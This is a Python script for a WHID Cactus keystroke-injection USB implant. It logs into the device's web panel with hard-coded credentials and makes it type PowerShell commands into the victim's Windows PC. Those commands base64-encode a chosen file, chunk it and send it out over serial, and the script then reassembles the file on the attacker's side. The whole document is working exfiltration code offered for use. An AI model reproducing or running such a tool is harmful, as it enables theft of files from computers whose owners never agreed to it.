import requests
import base64
import ntpath
import time
import sys
import os

from requests.auth import HTTPBasicAuth

creds = HTTPBasicAuth("admin", "hacktheplanet")
url = "http://192.168.1.1"
chunk_length = 1200
delay = 20

def usage():
    print(f"\nUSAGE:\n------\n{os.path.basename(__file__)} [PATH] or [-r] (= receive finnished data)")
    quit()

# CHECK CMD-LINE ARGS
resume = False
if len(sys.argv) != 2:
    usage()

# GET OR LOAD FILEPATH
if sys.argv[1] != "-r":
    file = sys.argv[1]
    with open(".cactus.exfil", "w") as f:
        f.write(file)
else:
    resume = True
    estimate = 1
    with open(".cactus.exfil", "r") as f:
        file = f.read()
    

# DELETE EXFIL-FILE TO START FRESH
if not resume:
    requests.get(f"{url}/deletepayload/yes?payload=/SerialEXFIL.txt")

    # START EXTRACTION OF FILE
    # Detection and initialisation of the port
    to_send = '$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like \'%VID_1b4f&PID_9208%\'").Caption;'
    to_send += '$com=[regex]::match($s,\'COM([0-9]+)\').Value;'
    to_send += '$WHIDport= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one;'
    to_send += 'echo "" > $env:TEMP\\tmp; echo "" > $env:TEMP\\tmp2; '

    # Read file
    to_send += f'$res = [convert]::ToBase64String((Get-Content -Path "{file}" -Encoding byte)); '
    # Split into chunks
    to_send += '$res -Split "(.{'+str(chunk_length)+'})" | ?{$_} > $env:TEMP\\tmp; '
    # Convert to ASCII
    to_send += '$chunks = Get-Content $env:TEMP\\tmp; $chunks | Set-Content -Encoding "ascii" $env:TEMP\\tmp; '
    # Open Port
    to_send += '$WHIDport.open(); '
    # Count chunks and send
    to_send += '$i=0; foreach($line in Get-Content $env:TEMP\\tmp){ $i++; } $WHIDport.WriteLine("SerialEXFIL:$i"); ';

    # Send commands to PC
    requests.post(f"{url}/runlivepayload", data={"livepayload": f'Press: 131+114\nDELAY: 1500\nPrintLine: powershell.exe', "livepayloadpresent": "1"})
    time.sleep(5)
    requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: {to_send}', "livepayloadpresent": "1"})
    time.sleep(5)

    # Get number of chunks
    chunks = 0
    while chunks == 0:
        res = requests.get(f"{url}/SerialEXFIL.txt", auth=creds).text
        try:
            chunks = int(res)
        except KeyboardInterrupt:
            quit()
        except:
            chunks = 0
            time.sleep(3)
    
    # Clear exfiltration file
    requests.get(f"{url}/deletepayload/yes?payload=/SerialEXFIL.txt")
    time.sleep(2)

    # Calculate est. length
    estimate = int((chunks * 1.4))
    print(f"Need to send {chunks} chunks - this will take {int(estimate / 60)} minutes!")

    # Run exfiltration
    to_send = '$i=2000; foreach($line in Get-Content $env:TEMP\\tmp){ Start-Sleep -Milliseconds $i; $WHIDport.WriteLine("SerialEXFIL:$line"); $i=800; } '
    to_send += '$WHIDport.Close(); exit;'
    requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: {to_send}', "livepayloadpresent": "1"})
    print("LET THE WHID CACTUS DO IT's JOB - DONT USE IT TILL THE ESTIMATED TIME HAS PASSED!!!")


# RECEIVE DATA
time.sleep(estimate)
res = ""
try:
    res = requests.get(f"{url}/SerialEXFIL.txt", auth=creds, timeout=25).text
    print(f"Got {len(res)} bytes")

    tmp = res.replace("\r", "").split("\n")
    for e in tmp[:-2]:
        if len(e) != chunk_length:
            print("ERROR - DATA IST DAMAGED")
            raise ValueError
except:
    quit()
        
# DECODE BASE64 AND SAVE
b64 = res.replace("\r", "").replace("\n", "").strip().encode("ascii")
byte_arr = base64.b64decode(b64)

# WRITE FILE
filename = ntpath.basename(file)
if os.path.isfile(filename):
    filename = f"{os.path.splitext(filename)[0]}_{int(time.time())}{os.path.splitext(filename)[1]}"
with open(filename, "wb") as f:
    f.write(byte_arr)

print(f"FILE {filename} ({len(byte_arr)} bytes) RECEIVED")
